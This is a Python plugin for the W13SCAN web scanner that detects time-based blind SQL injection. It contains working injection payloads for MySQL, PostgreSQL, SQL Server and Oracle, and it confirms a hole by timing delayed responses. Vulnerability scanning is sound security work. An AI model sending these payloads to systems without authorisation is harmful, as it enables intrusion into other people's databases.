#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2021/1/8 6:41 PM
# @Author  : Evi1ran
# @File    : sqli_time.py

import time
from lib.core.common import generateResponse, random_num
from lib.core.enums import PLACE, VulType
from lib.core.plugins import PluginBase


class W13SCAN(PluginBase):
    name = '基于时间SQL注入'

    def audit(self):
        sleep_time = 5
        sleep_str = "[SLEEP_TIME]"
        verify_count = 2
        num = random_num(4)
        sql_times = {
            "MySQL": (
                " AND SLEEP({})".format(sleep_str),
                " AND SLEEP({})--+".format(sleep_str),
                "' AND SLEEP({}) AND '{}'='{}".format(sleep_str, num, num),
                '''" AND SLEEP({}) AND "{}"="{}'''.format(sleep_str, num, num)),
            "Postgresql": (
                "AND {}=(SELECT {} FROM PG_SLEEP({}))".format(num, num, sleep_str),
                "AND {}=(SELECT {} FROM PG_SLEEP({}))--+".format(num, num, sleep_str),
            ),
            "Microsoft SQL Server or Sybase": (
                " waitfor delay '0:0:{}'--+".format(sleep_str), "' waitfor delay '0:0:{}'--+".format(sleep_str),
                '''" waitfor delay '0:0:{}'--+'''.format(sleep_str)),
            "Oracle": (
                " and 1= dbms_pipe.receive_message('RDS', {})--+".format(sleep_str),
                "' and 1= dbms_pipe.receive_message('RDS', {})--+".format(sleep_str),
                '''"  and 1= dbms_pipe.receive_message('RDS', {})--+'''.format(sleep_str),
                "AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),{})".format(sleep_str),
                "AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),{})--+".format(sleep_str),
            )
        }
        # 载入处理位置以及原始payload
        iterdatas = self.generateItemdatas()

        # 根据原始payload和位置组合新的payload
        for origin_dict, position in iterdatas:
            if position == PLACE.URI:
                continue
            for dbms_type, time_payloads in sql_times.items():
                time_payloads = [payload.replace(sleep_str, str(sleep_time)) for payload in time_payloads]
                payloads = self.paramsCombination(origin_dict, position, time_payloads)
                r1 = r0 = None
                for key, value, new_value, payload in payloads:
                    flag_count = 0
                    for test_count in range(verify_count):
                        start_time = time.perf_counter()
                        r1 = self.req(position, payload)
                        if not r1:
                            continue
                        end_time_1 = time.perf_counter()
                        delta1 = end_time_1 - start_time
                        if delta1 > sleep_time:
                            r0 = self.req(position, origin_dict)
                            end_time_0 = time.perf_counter()
                            delta0 = end_time_0 - end_time_1
                            if delta1 > delta0 > 0:
                                flag_count += 1
                                continue
                        break

                    if r1 is not None and flag_count == verify_count:
                        result = self.new_result()
                        result.init_info(self.requests.url, "SQL注入", VulType.SQLI)
                        result.add_detail("payload探测", r1.reqinfo, generateResponse(r1),
                                          "DBMS_TYPE:{}".format(dbms_type), key, payload,
                                          position)
                        self.success(result)
                        return True
